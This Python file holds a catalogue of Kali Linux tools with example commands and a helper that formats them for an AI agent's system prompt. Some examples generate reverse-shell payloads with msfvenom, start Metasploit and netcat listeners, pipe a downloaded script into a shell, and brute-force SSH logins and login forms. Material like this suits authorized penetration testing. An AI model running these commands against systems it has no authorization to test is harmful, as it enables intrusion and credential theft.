TOOL_KNOWLEDGE = {
    "recon": {
        "nmap": {
            "description": "Network discovery and port scanner",
            "syntax": "nmap [flags] <target>",
            "examples": [
                "nmap -sV 192.168.1.1",
                "nmap -sS -sV -O -A 192.168.1.0/24",
                "nmap -p- -T4 10.0.0.1",
                "nmap -sn 192.168.1.0/24",
                "nmap -sC -sV -oN scan.txt target.com"
            ],
            "category": "recon",
            "install": "nmap"
        },
        "masscan": {
            "description": "Massive parallel port scanner (faster than nmap)",
            "syntax": "masscan -p<ports> --rate=<rate> <target>",
            "examples": [
                "masscan -p1-65535 --rate=1000 192.168.1.1",
                "masscan -p80,443 --rate=500 10.0.0.0/24"
            ],
            "category": "recon",
            "install": "masscan"
        },
        "rustscan": {
            "description": "Fast port scanner written in Rust",
            "syntax": "rustscan -a <target>",
            "examples": [
                "rustscan -a 192.168.1.1 -- -sV",
                "rustscan -a 10.0.0.0/24 -- -sC"
            ],
            "category": "recon",
            "install": "rustscan"
        },
        "netcat": {
            "description": "Networking utility for reading/writing network connections",
            "syntax": "nc [flags] <target> <port>",
            "examples": [
                "nc -zv 192.168.1.1 22-100",
                "nc -lvnp 4444",
                "echo 'HEAD / HTTP/1.0' | nc target.com 80"
            ],
            "category": "recon",
            "install": "netcat-openbsd"
        }
    },
    "web": {
        "gobuster": {
            "description": "Directory/file and DNS busting tool",
            "syntax": "gobuster <mode> -u <url> -w <wordlist>",
            "examples": [
                "gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt",
                "gobuster dns -d target.com -w /usr/share/wordlists/dirb/common.txt"
            ],
            "category": "web",
            "install": "gobuster"
        },
        "ffuf": {
            "description": "Fast web fuzzer",
            "syntax": "ffuf -u <url> -w <wordlist>",
            "examples": [
                "ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt",
                "ffuf -u http://target.com -H 'Host: FUZZ.target.com' -w subdomains.txt"
            ],
            "category": "web",
            "install": "ffuf"
        },
        "nikto": {
            "description": "Web server vulnerability scanner",
            "syntax": "nikto -h <target>",
            "examples": [
                "nikto -h http://target.com",
                "nikto -h https://target.com -ssl -port 443"
            ],
            "category": "web",
            "install": "nikto"
        },
        "whatweb": {
            "description": "Web technology identification",
            "syntax": "whatweb <url>",
            "examples": [
                "whatweb target.com",
                "whatweb --aggression 3 target.com"
            ],
            "category": "web",
            "install": "whatweb"
        },
        "wpscan": {
            "description": "WordPress vulnerability scanner",
            "syntax": "wpscan --url <url>",
            "examples": [
                "wpscan --url http://target.com --enumerate u",
                "wpscan --url http://target.com --enumerate vp"
            ],
            "category": "web",
            "install": "wpscan"
        },
        "dirb": {
            "description": "Web content scanner",
            "syntax": "dirb <url> <wordlist>",
            "examples": [
                "dirb http://target.com",
                "dirb http://target.com /usr/share/wordlists/dirb/big.txt"
            ],
            "category": "web",
            "install": "dirb"
        },
        "sqlmap": {
            "description": "Automatic SQL injection detection and exploitation",
            "syntax": "sqlmap -u <url> [flags]",
            "examples": [
                "sqlmap -u 'http://target.com/page?id=1' --dbs",
                "sqlmap -u 'http://target.com/page?id=1' -D dbname --tables",
                "sqlmap -r request.txt --batch --banner"
            ],
            "category": "web",
            "install": "sqlmap"
        }
    },
    "exploit": {
        "metasploit": {
            "description": "Exploitation framework",
            "syntax": "msfconsole -q -x '<commands>'",
            "examples": [
                "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.5; set LPORT 4444; exploit'",
                "msfconsole -q -x 'search type:exploit name:apache; exit'"
            ],
            "category": "exploit",
            "install": "metasploit-framework"
        },
        "searchsploit": {
            "description": "Exploit-DB command-line search",
            "syntax": "searchsploit <term>",
            "examples": [
                "searchsploit apache 2.4.49",
                "searchsploit -m 50512",
                "searchsploit wordpress"
            ],
            "category": "exploit",
            "install": "exploitdb"
        },
        "msfvenom": {
            "description": "Payload generator for Metasploit",
            "syntax": "msfvenom -p <payload> [options] -o <output>",
            "examples": [
                "msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f elf -o shell.elf",
                "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o shell.exe"
            ],
            "category": "exploit",
            "install": "metasploit-framework"
        }
    },
    "password": {
        "hydra": {
            "description": "Online password cracking (brute-force)",
            "syntax": "hydra -l <user> -P <wordlist> <target> <service>",
            "examples": [
                "hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 ssh",
                "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt target.com http-post-form '/login:user=^USER^&pass=^PASS^:F=incorrect'"
            ],
            "category": "password",
            "install": "hydra"
        },
        "medusa": {
            "description": "Parallel network login auditor",
            "syntax": "medusa -h <target> -u <user> -P <wordlist> -M <module>",
            "examples": [
                "medusa -h 192.168.1.1 -u admin -P /usr/share/wordlists/rockyou.txt -M ssh"
            ],
            "category": "password",
            "install": "medusa"
        },
        "john": {
            "description": "John the Ripper offline password cracker",
            "syntax": "john [flags] <hashfile>",
            "examples": [
                "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
                "john --show hash.txt",
                "john --incremental hash.txt"
            ],
            "category": "password",
            "install": "john"
        },
        "hashcat": {
            "description": "Advanced GPU-based password recovery",
            "syntax": "hashcat -m <mode> -a <attack> <hashfile> <wordlist>",
            "examples": [
                "hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt",
                "hashcat -m 1000 -a 3 ntlm.txt ?a?a?a?a?a?a"
            ],
            "category": "password",
            "install": "hashcat"
        }
    },
    "osint": {
        "theharvester": {
            "description": "Email, subdomain, and name gathering tool",
            "syntax": "theharvester -d <domain> -b <source>",
            "examples": [
                "theharvester -d target.com -b google",
                "theharvester -d target.com -b all"
            ],
            "category": "osint",
            "install": "theharvester"
        },
        "sherlock": {
            "description": "Social media username search",
            "syntax": "sherlock <username>",
            "examples": [
                "sherlock johndoe",
                "sherlock --output results.txt username123"
            ],
            "category": "osint",
            "install": "sherlock"
        },
        "holehe": {
            "description": "Check if email is on various services",
            "syntax": "holehe <email>",
            "examples": [
                "holehe test@target.com"
            ],
            "category": "osint",
            "install": "holehe"
        },
        "whois": {
            "description": "Domain registration information lookup",
            "syntax": "whois <domain>",
            "examples": [
                "whois target.com",
                "whois 192.168.1.1"
            ],
            "category": "osint",
            "install": "whois"
        }
    },
    "network": {
        "tcpdump": {
            "description": "Packet capture and analysis tool",
            "syntax": "tcpdump [flags] <filter>",
            "examples": [
                "tcpdump -i eth0 -nn -X port 80",
                "tcpdump -i any -w capture.pcap",
                "tcpdump -r capture.pcap"
            ],
            "category": "network",
            "install": "tcpdump"
        },
        "tshark": {
            "description": "Wireshark CLI - packet analyzer",
            "syntax": "tshark [flags]",
            "examples": [
                "tshark -i eth0 -T fields -e ip.src -e ip.dst -e tcp.port",
                "tshark -r capture.pcap -Y 'http.request'"
            ],
            "category": "network",
            "install": "tshark"
        },
        "dnsrecon": {
            "description": "DNS enumeration tool",
            "syntax": "dnsrecon -d <domain>",
            "examples": [
                "dnsrecon -d target.com",
                "dnsrecon -d target.com -t axfr"
            ],
            "category": "network",
            "install": "dnsrecon"
        },
        "dig": {
            "description": "DNS lookup utility",
            "syntax": "dig <domain> <type>",
            "examples": [
                "dig target.com ANY",
                "dig -x 192.168.1.1",
                "dig target.com MX"
            ],
            "category": "network",
            "install": "dnsutils"
        }
    },
    "post_exploit": {
        "linpeas": {
            "description": "Linux privilege escalation enumeration script",
            "syntax": "./linpeas.sh",
            "examples": [
                "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh"
            ],
            "category": "post_exploit",
            "install": "download from github"
        },
        "winpeas": {
            "description": "Windows privilege escalation enumeration script",
            "syntax": ".\\winpeas.exe",
            "examples": [],
            "category": "post_exploit",
            "install": "download from github"
        }
    }
}


class KaliKnowledge:
    """Provides structured knowledge about Kali Linux tools."""

    @staticmethod
    def get_all_tools() -> dict:
        return TOOL_KNOWLEDGE.copy()

    @staticmethod
    def get_tool(name: str) -> dict:
        for category, tools in TOOL_KNOWLEDGE.items():
            if name in tools:
                return tools[name]
        return None

    @staticmethod
    def search_tools(query: str) -> list:
        query = query.lower()
        results = []
        for category, tools in TOOL_KNOWLEDGE.items():
            for name, data in tools.items():
                if query in name.lower() or query in data["description"].lower():
                    results.append({"name": name, "category": category, **data})
        return results

    @staticmethod
    def get_tools_by_category(category: str) -> dict:
        return TOOL_KNOWLEDGE.get(category, {})

    @staticmethod
    def get_tools_by_purpose(purpose: str) -> list:
        mapping = {
            "scan": ["nmap", "masscan", "rustscan"],
            "web": ["gobuster", "ffuf", "nikto", "whatweb", "wpscan", "dirb", "sqlmap"],
            "exploit": ["metasploit", "searchsploit", "msfvenom"],
            "brute": ["hydra", "medusa", "john", "hashcat"],
            "osint": ["theharvester", "sherlock", "holehe", "whois", "dnsrecon"],
            "network": ["tcpdump", "tshark", "dig", "netcat"],
            "privesc": ["linpeas", "winpeas"],
        }
        result = []
        for name in mapping.get(purpose, []):
            tool = KaliKnowledge.get_tool(name)
            if tool:
                result.append({"name": name, **tool})
        return result

    @staticmethod
    def format_for_prompt(max_tools=30) -> str:
        """Format tool knowledge for AI system prompt injection."""
        lines = ["## Kali Linux Tools Available", ""]
        count = 0
        for category, tools in TOOL_KNOWLEDGE.items():
            if count >= max_tools:
                break
            lines.append(f"### {category.upper()}")
            for name, data in tools.items():
                if count >= max_tools:
                    break
                ex = data["examples"][0] if data["examples"] else ""
                lines.append(f"- {name}: {data['description']}")
                if ex:
                    lines.append(f"  Example: {ex}")
                count += 1
            lines.append("")
        return "\n".join(lines)
